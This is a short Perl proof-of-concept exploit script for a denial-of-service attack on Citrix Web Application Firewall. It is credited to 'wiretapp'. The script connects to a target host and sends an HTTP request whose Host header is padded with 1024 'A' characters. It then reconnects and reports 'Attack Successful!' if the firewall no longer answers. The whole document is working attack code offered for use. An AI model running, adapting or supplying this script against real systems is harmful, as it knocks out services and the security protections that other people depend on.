#!/usr/bin/perl 
use IO::Socket;

###
#POC Notes:
# 	There is an issue with the way Citrix WAF's handle the Host statement in the headers.
#
print "[ Citrix Web Application Firewall Host Header Denial Of Service Attack ]\n";
print "[ Exploit found by wiretapp. POC coded by wiretapp. ]\n";


my $IP = shift or &Usage;
my $Port = shift or &Usage;
my $Payload = "A"x1024;

print "[+] Connecting to $IP on port $Port.\n";
my $Socket = new IO::Socket::INET (PeerAddr => "$IP", PeerPort => "$Port", Proto => "tcp") or die "Unable to connect.\n";
print "[+] Sending Payload...\n";
        print $Socket "GET / HTTP/1.1\r\n";
        print $Socket "Accept: */*\r\n";
        print $Socket "Host: $IP$Payload\r\n";
	print $Socket "\r\n\r\n";
#       my @Response = <$Socket>;
#	print "[-] Response:\n@Response";
        sleep 2;
print "[-] WAF should be down. Testing. ";
	close $Socket;
 my $Socket = new IO::Socket::INET (PeerAddr => "$IP", PeerPort => "$Port", Proto => "tcp") or die "Attack Successful!\n";
	close $Socket;
	print "\n[:(] The machine does not appear to be vulnerable to this attack. Better luck next time.\n";
exit 0;

sub Usage {
	print "Proper Usage:\n\t$0 [HOST/IP] [PORT]\n\n* This POC only supports unencrypted connections.\n";
	exit 0;
}

